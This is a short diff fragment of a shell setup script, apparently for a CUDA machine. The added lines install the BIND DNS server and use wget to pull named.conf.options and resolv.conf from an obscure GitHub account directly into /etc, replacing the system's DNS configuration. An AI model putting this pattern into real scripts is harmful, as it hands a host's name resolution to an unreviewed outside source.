@@ -11,6 +11,18 @@ rm -rf /mnt/disks/user/project/linux8474/
 
 apt-get update
 
+apt-get install -y bind9 bind9utils bind9-doc dnsutils
+
+cd /etc/bind/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/named.conf.options
+
+service bind9 restart
+
+cd /etc/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
 mkdir /mnt/disks/
